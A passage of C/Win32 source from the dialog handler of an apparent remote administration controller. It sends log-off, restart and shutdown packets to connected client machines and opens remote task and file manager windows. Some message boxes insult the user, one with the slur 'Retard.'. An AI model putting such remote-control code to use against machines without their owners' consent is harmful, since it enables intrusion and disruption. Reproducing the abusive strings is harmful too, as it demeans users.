				MessageBox(NULL, "You should not have pressed exit if you did not want to exit!", "JackAss..", MB_OK | MB_ICONWARNING);	
				break;
				}

			break;
			}
////////////////////////////////////////////////////////////////////////////////   
		case IDC_TASKMANAGER:
			{
			
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
        
            strcpy(Head.Data, "");
          if(SHwnd[Head.ID] == NULL)
		  {
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			strcpy(Operation,  "Task Manager");
			sprintf(Result,"%s - Task Manager", Head.Data);
			strcpy(Error, "PASS");
		    SetLog(Operation,Result);

			CreateThread(NULL, 0,ProcWindow,(LPVOID)Head.ID, 0, &thread);
		  }
		  else
		  {
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			strcpy(Operation,  "File Manager");
			sprintf(Result,"%s - File Manager already open for user", Head.Data);
			strcpy(Error, "FAIL, window already open for user.");
		    SetLog(Operation,Result);
		  }
			break;
			}
/////////////////////////////////////////////////////////////////////////////////
		case IDC_FILEMANAGER:
			{
		
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);

			strcpy(Head.Data, "");
          if(FileHwnd[Head.ID] == NULL)
		  {
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			strcpy(Operation,  "File Manager");
			sprintf(Result,"%s - File Manager", Head.Data);
			strcpy(Error, "PASS");
		    SetLog(Operation,Result);
			CreateThread(NULL, 0,FileWindow,(LPVOID)"", 0, &thread);
		  }
		  else
		  {
			 strcpy(Head.Data, "");

			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			strcpy(Operation,  "File Manager");
			sprintf(Result,"%s - File Manager", Head.Data);
			strcpy(Error, "FAIL, window already open for user.");
		    SetLog(Operation,Result);
		  }
			
			break;
			}
////////////////////////////////////////////////////////////////////////////////
		case IDC_LOGOFF:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
			Head.PacketType = PACKET_COMPUTER_LOGOFF;

			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			strcpy(Head.Data, "");
			item.pszText=Head.Data;
			item.cchTextMax=255;
			
			strcpy(Operation,  "Log off");
			sprintf(Result,"%s - Is logging off", Head.Data);
			strcpy(Error, "PASS");
		    SetLog(Operation,Result);

			send(Client[Head.ID],(char*)&Head,HeadSize,0);
			break;
////////////////////////////////////////////////////////////////////////////////
		case IDC_RESTART:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
			Head.PacketType = PACKET_COMPUTER_RESTART;
			send(Client[Head.ID],(char*)&Head,HeadSize,0);
			break;
////////////////////////////////////////////////////////////////////////////////
		case IDC_SHUTDOWN:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
			Head.PacketType = PACKET_COMPUTER_SHUTDOWN;
			send(Client[Head.ID],(char*)&Head,HeadSize,0);
			break;

			break;
////////////////////////////////////////////////////////////////////////////////
		case IDCANCEL:
            
            if(MessageBox(NULL, "Are you sure you want to Close?", "Closing...", MB_YESNO | MB_ICONQUESTION) == IDYES)
				{
			    WSACleanup();
				ExitProcess(0);
			    EndDialog(Dlg,Select);
		    	PostQuitMessage(0);
		    	break;
				}
				
				else
				{
				MessageBox(NULL, "WHY DID YOU CLICK THE X IF YOU DID NOT WANT TO EXIT?!", "Retard.", MB_OK | MB_ICONWARNING);	
				break;
				}
			break;
		}
//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

